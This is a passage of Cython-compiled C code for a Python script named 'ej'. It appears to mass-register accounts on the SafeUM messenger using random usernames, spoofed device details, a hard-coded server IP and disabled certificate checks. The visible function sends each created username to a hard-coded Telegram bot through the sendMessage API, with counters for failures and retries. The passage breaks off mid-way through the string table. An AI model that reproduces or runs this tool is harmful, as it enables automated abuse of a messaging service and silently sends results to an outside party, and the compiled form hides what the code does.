__pyx_kp_u_https_api_telegram_org_bot);\n        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_token); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 84, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_2);\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_13;\n        __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);\n        __Pyx_GIVEREF(__pyx_t_2);\n        PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);\n        __pyx_t_2 = 0;\n        __Pyx_INCREF(__pyx_kp_u_sendMessage_chat_id);\n        __pyx_t_12 += 21;\n        __Pyx_GIVEREF(__pyx_kp_u_sendMessage_chat_id);\n        PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_sendMessage_chat_id);\n        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_2);\n        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 84, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n        __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_13;\n        __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);\n        __Pyx_GIVEREF(__pyx_t_5);\n        PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_5);\n        __pyx_t_5 = 0;\n        __Pyx_INCREF(__pyx_kp_u_text);\n        __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;\n        __pyx_t_12 += 39;\n        __Pyx_GIVEREF(__pyx_kp_u_text);\n        PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u_text);\n        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 84, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_13;\n        __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);\n        __Pyx_GIVEREF(__pyx_t_5);\n        PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_5);\n        __pyx_t_5 = 0;\n        __Pyx_INCREF(__pyx_kp_u_hhhh_JE_N_O);\n        __pyx_t_13 = (1114111 > __pyx_t_13) ? 1114111 : __pyx_t_13;\n        __pyx_t_12 += 34;\n        __Pyx_GIVEREF(__pyx_kp_u_hhhh_JE_N_O);\n        PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u_hhhh_JE_N_O);\n        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_1, 7, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 84, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n        __pyx_t_1 = NULL;\n        __pyx_t_4 = 0;\n        #if CYTHON_UNPACK_METHODS\n        if (unlikely(PyMethod_Check(__pyx_t_3))) {\n          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);\n          if (likely(__pyx_t_1)) {\n            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);\n            __Pyx_INCREF(__pyx_t_1);\n            __Pyx_INCREF(function);\n            __Pyx_DECREF_SET(__pyx_t_3, function);\n            __pyx_t_4 = 1;\n          }\n        }\n        #endif\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_1, __pyx_t_5};\n          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);\n          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 83, __pyx_L3_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n        }\n        __pyx_v_t = __pyx_t_6;\n        __pyx_t_6 = 0;\n\n        \n        goto __pyx_L9;\n      }\n\n      \n      /*else*/ {\n        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_failed); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 86, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_6);\n        __pyx_t_3 = __Pyx_PyInt_AddObjC(__pyx_t_6, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_3);\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n        if (PyDict_SetItem(__pyx_d, __pyx_n_s_failed, __pyx_t_3) < 0) __PYX_ERR(0, 86, __pyx_L3_error)\n        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      }\n      __pyx_L9:;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n    goto __pyx_L8_try_end;\n    __pyx_L3_error:;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n    \n    /*except:*/ {\n      __Pyx_AddTraceback("ej.work", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 87, __pyx_L5_except_error)\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_6);\n      __Pyx_XGOTREF(__pyx_t_5);\n\n      \n      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_retry); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 88, __pyx_L5_except_error)\n      __Pyx_GOTREF(__pyx_t_1);\n      __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 88, __pyx_L5_except_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n      if (PyDict_SetItem(__pyx_d, __pyx_n_s_retry, __pyx_t_2) < 0) __PYX_ERR(0, 88, __pyx_L5_except_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      goto __pyx_L4_exception_handled;\n    }\n\n    \n    __pyx_L5_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_9);\n    __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n    goto __pyx_L1_error;\n    __pyx_L4_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_9);\n    __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n    __pyx_L8_try_end:;\n  }\n\n  \n\n  /* function exit code */\n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_10);\n  __Pyx_AddTraceback("ej.work", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_username);\n  __Pyx_XDECREF(__pyx_v_con);\n  __Pyx_XDECREF(__pyx_v_gzip);\n  __Pyx_XDECREF(__pyx_v_t);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyMethodDef __pyx_methods[] = {\n  {0, 0, 0, 0}\n};\n#ifndef CYTHON_SMALL_CODE\n#if defined(__clang__)\n    #define CYTHON_SMALL_CODE\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\n    #define CYTHON_SMALL_CODE __attribute__((cold))\n#else\n    #define CYTHON_SMALL_CODE\n#endif\n#endif\n/* #### Code section: pystring_table ### */\n\nstatic int __Pyx_CreateStringTabAndInitStrings(void) {\n  __Pyx_StringTabEntry __pyx_string_tab[] = {\n    {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},\n    {&__pyx_kp_u_0000, __pyx_k_0000, sizeof(__pyx_k_0000), 0, 1, 0, 0},\n    {&__pyx_kp_u_02, __pyx_k_02, sizeof(__pyx_k_02), 0, 1, 0, 0},\n    {&__pyx_kp_u_04eb364e4ef79f31f3e95df2a956e9c7, __pyx_k_04eb364e4ef79f31f3e95df2a956e9c7, sizeof(__pyx_k_04eb364e4ef79f31f3e95df2a956e9c7), 0, 1, 0, 0},\n    {&__pyx_kp_u_0d99759f972c527722a18a74b3e0b3c6, __pyx_k_0d99759f972c527722a18a74b3e0b3c6, sizeof(__pyx_k_0d99759f972c527722a18a74b3e0b3c6), 0, 1, 0, 0},\n    {&__pyx_kp_u_1734805700, __pyx_k_1734805700, sizeof(__pyx_k_1734805700), 0, 1, 0, 0},\n    {&__pyx_kp_u_193_200_173_45, __pyx_k_193_200_173_45, sizeof(__pyx_k_193_200_173_45), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_1_0_1380, __pyx_k_1_1_0_1380, sizeof(__pyx_k_1_1_0_1380), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_30m, __pyx_k_1_30m, sizeof(__pyx_k_1_30m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_31m, __pyx_k_1_31m, sizeof(__pyx_k_1_31m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_32m, __pyx_k_1_32m, sizeof(__pyx_k_1_32m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_33m, __pyx_k_1_33m, sizeof(__pyx_k_1_33m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_34m, __pyx_k_1_34m, sizeof(__pyx_k_1_34m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_35m, __pyx_k_1_35m, sizeof(__pyx_k_1_35m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_36m, __pyx_k_1_36m, sizeof(__pyx_k_1_36m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_37m, __pyx_k_1_37m, sizeof(__pyx_k_1_37m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_91m, __pyx_k_1_91m, sizeof(__pyx_k_1_91m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_92m, __pyx_k_1_92m, sizeof(__pyx_k_1_92m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_93m, __pyx_k_1_93m, sizeof(__pyx_k_1_93m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_95m, __pyx_k_1_95m, sizeof(__pyx_k_1_95m), 0, 1, 0, 0},\n    {&__pyx_kp_u_1_96m, __pyx_k_1_96m, sizeof(__pyx_k_1_96m), 0, 1, 0, 0},\n    {&__pyx_kp_u_2023_04_30_12_13_32, __pyx_k_2023_04_30_12_13_32, sizeof(__pyx_k_2023_04_30_12_13_32), 0, 1, 0, 0},\n    {&__pyx_kp_u_219d1d9b049550f26a6c7b7914a44da1, __pyx_k_219d1d9b049550f26a6c7b7914a44da1, sizeof(__pyx_k_219d1d9b049550f26a6c7b7914a44da1), 0, 1, 0, 0},\n    {&__pyx_kp_u_2_32m, __pyx_k_2_32m, sizeof(__pyx_k_2_32m), 0, 1, 0, 0},\n    {&__pyx_kp_u_2_36m, __pyx_k_2_36m, sizeof(__pyx_k_2_36m), 0, 1, 0, 0},\n    {&__pyx_kp_u_2_39m, __pyx_k_2_39m, sizeof(__pyx_k_2_39m), 0, 1, 0, 0},\n    {&__pyx_kp_u_4b4d1468bfaf01a82c574ea71c44052d, __pyx_k_4b4d1468bfaf01a82c574ea71c44052d, sizeof(__pyx_k_4b4d1468bfaf01a82c574ea71c44052d), 0, 1, 0, 0},\n    {&__pyx_kp_u_503c73d12b354f86ff9706b211470438, __pyx_k_503c73d12b354f86ff9706b211470438, sizeof(__pyx_k_503c73d12b354f86ff9706b211470438), 0, 1, 0, 0},\n    {&__pyx_kp_u_6387ae32b7087257452ae27fc8a925dd, __pyx_k_6387ae32b7087257452ae27fc8a925dd, sizeof(__pyx_k_6387ae32b7087257452ae27fc8a925dd), 0, 1, 0, 0},\n    {&__pyx_kp_u_8c6ec7ce0b9108d882bb076be6e49fe2, __pyx_k_8c6ec7ce0b9108d882bb076be6e49fe2, sizeof(__pyx_k_8c6ec7ce0b9108d882bb076be6e49fe2), 0, 1, 0, 0},\n    {&__pyx_n_s_AB, __pyx_k_AB, sizeof(__pyx_k_AB), 0, 0, 1, 1},\n    {&__pyx_n_u_AND, __pyx_k_AND, sizeof(__pyx_k_AND), 0, 1, 0, 1},\n    {&__pyx_n_s_A_bSa, __pyx_k_A_bSa, sizeof(__pyx_k_A_bSa), 0, 0, 1, 1},\n    {&__pyx_n_s_Ab, __pyx_k_Ab, sizeof(__pyx_k_Ab), 0, 0, 1, 1},\n    {&__pyx_n_s_AbBs, __pyx_k_AbBs, sizeof(__pyx_k_AbBs), 0, 0, 1, 1},\n    {&__pyx_n_s_B, __pyx_k_B, sizeof(__pyx_k_B), 0, 0, 1, 1},\n    {&__pyx_n_s_Ba_bS, __pyx_k_Ba_bS, sizeof(__pyx_k_Ba_bS), 0, 0, 1, 1},\n    {&__pyx_n_s_Bl, __pyx_k_Bl, sizeof(__pyx_k_Bl), 0, 0, 1, 1},\n    {&__pyx_n_s_C, __pyx_k_C, sizeof(__pyx_k_C), 0, 0, 1, 1},\n    {&__pyx_n_s_CERT_NONE, __pyx_k_CERT_NONE, sizeof(__pyx_k_CERT_NONE), 0, 0, 1, 1},\n    {&__pyx_n_u_Desktop, __pyx_k_Desktop, sizeof(__pyx_k_Desktop), 0, 1, 0, 1},\n    {&__pyx_n_s_E, __pyx_k_E, sizeof(__pyx_k_E), 0, 0, 1, 1},\n    {&__pyx_n_s_F, __pyx_k_F, sizeof(__pyx_k_F), 0, 0, 1, 1},\n    {&__pyx_n_s_G, __pyx_k_G, sizeof(__pyx_k_G), 0, 0, 1, 1},\n    {&__pyx_kp_u_JE_N_O, __pyx_k_JE_N_O, sizeof(__pyx_k_JE_N_O), 0, 1, 0, 0},\n    {&__pyx_n_u_Jana, __pyx_k_Jana, sizeof(__pyx_k_Jana), 0, 1, 0, 1},\n    {&__pyx_n_s_P, __pyx_k_P, sizeof(__pyx_k_P), 0, 0, 1, 1},\n    {&__pyx_n_s_PN, __pyx_k_PN, sizeof(__pyx_k_PN), 0, 0, 1, 1},\n    {&__pyx_n_s_R, __pyx_k_R, sizeof(__pyx_k_R), 0, 0, 1, 1},\n    {&__pyx_n_u_Register, __pyx_k_Register, sizeof(__pyx_k_Register), 0, 1, 0, 1},\n    {&__pyx_n_s_S, __pyx_k_S, sizeof(__pyx_k_S), 0, 0, 1, 1},\n    {&__pyx_n_s_S_aBs, __pyx_k_S_aBs, sizeof(__pyx_k_S_aBs), 0, 0, 1, 1},\n    {&__pyx_n_s_ThreadPoolExecutor, __pyx_k_ThreadPoolExecutor, sizeof(__pyx_k_ThreadPoolExecutor), 0, 0, 1, 1},\n    {&__pyx_n_s_W, __pyx_k_W, sizeof(__pyx_k_W), 0, 0, 1, 1},\n    {&__pyx_kp_u_Xiaomi_Redmi_Note_8_Pro, __pyx_k_Xiaomi_Redmi_Note_8_Pro, sizeof(__pyx_k_Xiaomi_Redmi_Note_8_Pro), 0, 1, 0, 0},\n    {&__pyx_n_s_Y, __pyx_k_Y, sizeof(__pyx_k_Y), 0, 0, 1, 1},\n    {&__pyx_n_s_Ya_Bs, __pyx_k_Ya_Bs, sizeof(__pyx_k_Ya_Bs), 0, 0, 1, 1},\n    {&__pyx_kp_u__11, __pyx_k__11, sizeof(__pyx_k__11), 0, 1, 0, 0},\n    {&__pyx_kp_u__12, __pyx_k__12, sizeof(__pyx_k__12), 0, 1, 0, 0},\n    {&__pyx_kp_u__15, __pyx_k__15, sizeof(__pyx_k__15), 0, 1, 0, 0},\n    {&__pyx_kp_u__16, __pyx_k__16, sizeof(__pyx_k__16), 0, 1, 0, 0},\n    {&__pyx_kp_u__17, __pyx_k__17, sizeof(__pyx_k__17), 0, 1, 0, 0},\n    {&__pyx_kp_u__18, __pyx_k__18, sizeof(__pyx_k__18), 0, 1, 0, 0},\n    {&__pyx_n_s__20, __pyx_k__20, sizeof(__pyx_k__20), 0, 0, 1, 1},\n    {&__pyx_n_s__3, __pyx_k__3, sizeof(__pyx_k__3), 0, 0, 1, 1},\n    {&__pyx_kp_u__6, __pyx_k__6, sizeof(__pyx_k__6), 0, 1, 0, 0},\n    {&__pyx_n_s_aB, __pyx_k_aB, sizeof(__pyx_k_aB), 0, 0, 1, 1},\n    {&__pyx_n_s_aBbs, __pyx_k_aBbs, sizeof(__pyx_k_aBbs), 0, 0, 1, 1},\n    {&__pyx_n_s_a_aB_s, __pyx_k_a_aB_s, sizeof(__pyx_k_a_aB_s), 0, 0, 1, 1},\n    {&__pyx_n_s_a_bSa, __pyx_k_a_bSa, sizeof(__pyx_k_a_bSa), 0, 0, 1, 1},\n    {&__pyx_n_s_ab, __pyx_k_ab, sizeof(__pyx_k_ab), 0, 0, 1, 1},\n    {&__pyx_n_s_accounts, __pyx_k_accounts, sizeof(__pyx_k_accounts), 0, 0, 1, 1},\n    {&__pyx_n_u_action, __pyx_k_action, sizeof(__pyx_k_action), 0, 1, 0, 1},\n    {&__pyx_kp_u_and_11_0_0, __pyx_k_and_11_0_0, sizeof(__pyx_k_and_11_0_0), 0, 1, 0, 0},\n    {&__pyx_n_u_app, __pyx_k_app, sizeof(__pyx_k_app), 0, 1, 0, 1},\n    {&__pyx_n_s_asyncio_coroutines, __pyx_k_asyncio_coroutines, sizeof(__pyx_k_asyncio_coroutines), 0, 0, 1, 1},\n    {&__pyx_n_u_b31d0165dde6b3d204263d6ea4b96789, __pyx_k_b31d0165dde6b3d204263d6ea4b96789, sizeof(__pyx_k_b31d0165dde6b3d204263d6ea4b96789), 0, 1, 0, 1},\n    {&__pyx_kp_u_b6cbb22d_06ca_41ff_8fda_c0ddeb14, __pyx_k_b6cbb22d_06ca_41ff_8fda_c0ddeb14, sizeof(__pyx_k_b6cbb22d_06ca_41ff_8fda_c0ddeb14), 0, 1, 0, 0},\n    {&__pyx_n_u_basic, __pyx_k_basic, sizeof(__pyx_k_basic), 0, 1, 0, 1},\n    {&__pyx_n_u_c72d110c1ae40d50, __pyx_k_c72d110c1ae40d50, sizeof(__pyx_k_c72d110c1ae40d50), 0, 1, 0, 1},\n    {&__pyx_n_u_cert_reqs, __pyx_k_cert_reqs, sizeof(__pyx_k_cert_reqs), 0, 1, 0, 1},\n    {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},\n    {&__pyx_n_s_choices, __pyx_k_choices, sizeof(__pyx_k_choices), 0, 0, 1, 1},\n    {&__pyx_n_u_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 1, 0, 1},\n    {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},\n    {&__pyx_kp_u_com_safeum_android, __pyx_k_com_safeum_android, sizeof(__pyx_k_com_safeum_android), 0, 1, 0, 0},\n    {&__pyx_n_s_con, __pyx_k_con, sizeof(__pyx_k_con), 0, 0, 1, 1},\n    {&__pyx_n_s_concurrent_futures, __pyx_k_concurrent_futures, sizeof(__pyx_k_concurrent_futures), 0, 0, 1, 1},\n    {&__pyx_n_s_create_connection, __pyx_k_create_connection, sizeof(__pyx_k_create_connection), 0, 0, 1, 1},\n    {&__pyx_n_s_decode, __pyx_k_decode, sizeof(__pyx_k_decode), 0, 0, 1, 1},\n    {&__pyx_n_s_decompress, __pyx_k_decompress, sizeof(__pyx_k_decompress), 0, 0, 1, 1},\n    {&__pyx_n_u_devicename, __pyx_k_devicename, sizeof(__pyx_k_devicename), 0, 1, 0, 1},\n    {&__pyx_n_u_devicepushuid, __pyx_k_devicepushuid, sizeof(__pyx_k_devicepushuid), 0, 1, 0, 1},\n    {&__pyx_n_u_deviceuid, __pyx_k_deviceuid, sizeof(__pyx_k_deviceuid), 0, 1, 0, 1},\n    {&__pyx_n_s_dumps, __pyx_k_dumps, sizeof(__pyx_k_dumps), 0, 0, 1, 1},\n    {&__pyx_kp_u_dxT6B6Solm0_APA91bHqL8wxzlyKHck, __pyx_k_dxT6B6Solm0_APA91bHqL8wxzlyKHck, sizeof(__pyx_k_dxT6B6Solm0_APA91bHqL8wxzlyKHck), 0, 1, 0, 0},\n    {&__pyx_n_u_e38cb9e83aef6ceb60a7a71493317903, __pyx_k_e38cb9e83aef6ceb60a7a71493317903, sizeof(__pyx_k_e38cb9e83aef6ceb60a7a71493317903), 0, 1, 0, 1},\n    {&__pyx_n_u_ef1608faa151cb7989b0ba7f57b39822, __pyx_k_ef1608faa151cb7989b0ba7f57b39822, sizeof(__pyx_k_ef1608faa151cb7989b0ba7f57b39822), 0, 1, 0, 1},\n    {&__pyx_n_s_ej, __pyx_k_ej, sizeof(__pyx_k_ej), 0, 0, 1, 1},\n    {&__pyx_kp_s_ej_py, __pyx_k_ej_py, sizeof(__pyx_k_ej_py), 0, 0, 1, 0},\n    {&__pyx_n_u_en_GB, __pyx_k_en_GB, sizeof(__pyx_k_en_GB), 0, 1, 0, 1},\n    {&__pyx_n_s_faB_s, __pyx_k_faB_s, sizeof(__pyx_k_faB_s), 0, 0, 1, 1},\n    {&__pyx_n_s_failed, __pyx_k_failed, sizeof(__pyx_k_failed), 0, 0, 1, 1},\n    {&__pyx_n_s_figlet_format, __pyx_k_figlet_format, sizeof(__pyx_k_figlet_format), 0, 0, 1, 1},\n    {&__pyx_n_s_font, __pyx_k_font, sizeof(__pyx_k_font), 0, 0, 1, 1},\n    {&__pyx_n_u_gmt, __pyx_k_gmt, sizeof(__pyx_k_gmt), 0, 1, 0, 1},\n    {&__pyx_n_s_gzip, __pyx_k_gzip, sizeof(__pyx_k_gzip), 0, 0, 1, 1},\n    {&__pyx_n_s_header, __pyx_k_header, sizeof(__pyx_k_header), 0, 0, 1, 1},\n    {&__pyx_kp_u_hhhh_JE_N_O, __pyx_k_hhhh_JE_N_O, sizeof(__pyx_k_hhhh_JE_N_O), 0, 1, 0, 0},\n    {&__pyx_n_u_host, __pyx_k_host, sizeof(__pyx_k_host), 0, 1, 0, 1},\n    {&__pyx_kp_u_https_api_telegram_org_bot, __pyx_k_https_api_telegram_org_bot, sizeof(__pyx_k_https_api_telegram_org_bot), 0, 1, 0, 0},\n    {&__pyx_n_u_hvtctchnjvfxfx, __pyx_k_hvtctchnjvfxfx, sizeof(__pyx_k_hvtctchnjvfxfx), 0, 1, 0, 1},\n    {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},\n    {&__pyx_n_u_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 1, 0, 1},\n    {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},\n    {&__pyx_n_s_initializing, __pyx_k_initializing, sizeof(__pyx_k_initializing), 0, 0, 1, 1},\n    {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},\n    {&__pyx_n_s_is_coroutine, __pyx_k_is_coroutine, sizeof(__pyx_k_is_coroutine), 0, 0, 1, 1},\n    {&__pyx_n_u_iv, __pyx_k_iv, sizeof(__pyx_k_iv), 0, 1, 0, 1},\n    {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},\n    {&__pyx_n_s_k, __pyx_k_k, sizeof(__pyx_k_k), 0, 0, 1, 1},\n    {&__pyx_n_u_locale, __pyx_k_locale, sizeof(__pyx_k_locale), 0, 1, 0, 1},\n    {&__pyx_n_u_login, __pyx_k_login, sizeof(__pyx_k_login), 0, 1, 0, 1},\n    {&__pyx_n_u_m1x, __pyx_k_m1x, sizeof(__pyx_k_m1x), 0, 1, 0, 1},\n    {&__pyx_n_u_m1y, __pyx_k_m1y, sizeof(__pyx_k_m1y), 0, 1, 0, 1},\n    {&__pyx_n_u_m2, __pyx_k_m2, sizeof(__pyx_k_m2), 0, 1, 0, 1},\n    {&__pyx_n_u_magicword, __pyx_k_magicword, sizeof(__pyx_k_magicword), 0, 1, 0, 1},\n    {&__pyx_n_u_magicwordhint, __pyx_k_magicwordhint, sizeof(__pyx_k_magicwordhint), 0, 1, 0, 1},\n    {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},\n    {&__pyx_n_s_max_workers, __pyx_k_max_workers, sizeof(__pyx_k_max_workers), 0, 0, 1, 1},\n    {&__pyx_n_u_message, __pyx_k_message, sizeof(__pyx_k_message), 0, 1, 0, 1},\n    {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},\n    {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},\n    {&__pyx_n_u_nickname, __pyx_k_nickname, sizeof(__pyx_k_nickname), 0, 1, 0, 1},\n    {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},\n    {&__pyx_n_u_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 1, 0, 1},\n    {&__pyx_n_u_osversion, __pyx_k_osversion, sizeof(__pyx_k_osversion), 0, 1, 0, 1},\n    {&__pyx_n_u_password, __pyx_k_password, sizeof(__pyx_k_password), 0, 1, 0, 1},\n    {&__pyx_kp_u_pip_install_pyfiglet, __pyx_k_pip_install_pyfiglet, sizeof(__pyx_k_pip_install_pyfiglet), 0, 1, 0, 0},\n    {&__pyx_kp_u_pip_install_requests, __pyx_k_pip_install_requests, sizeof(__pyx_k_pip_install_requests), 0, 1, 0, 0},\n    {&__pyx_kp_u_pip_install_websocket_client, __pyx_k_pip_install_websocket_client, sizeof(__pyx_k_pip_install_websocket_client), 0, 1, 0, 0},\n    {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},\n    {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},\n    {&__pyx_n_s_pyfiglet, __pyx_k_pyfiglet, sizeof(__pyx_k_pyfiglet), 0, 0, 1, 1},\n    {&__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm, __pyx_k_qwertyuioplkjhgfdsazxcvbnm, sizeof(__pyx_k_qwertyuioplkjhgfdsazxcvbnm), 0, 1, 0, 1},\n    {&__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm123456, __pyx_k_qwertyuioplkjhgfdsazxcvbnm123456, sizeof(__pyx_k_qwertyuioplkjhgfdsazxcvbnm123456), 0, 1, 0, 1},\n    {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},\n    {&__pyx_n_s_recv, __pyx_k_recv, sizeof(__pyx_k_recv), 0, 0, 1, 1},\n    {&__pyx_n_u_remoteIp, __pyx_k_remoteIp, sizeof(__pyx_k_remoteIp), 0, 1, 0, 1},\n    {&__pyx_n_u_remotePort, __pyx_k_remotePort, sizeof(__pyx_k_remotePort), 0, 1, 0, 1},\n    {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},\n    {&__pyx_n_s_retry, __pyx_k_retry, sizeof(__pyx_k_retry), 0, 0, 1, 1},\n    {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 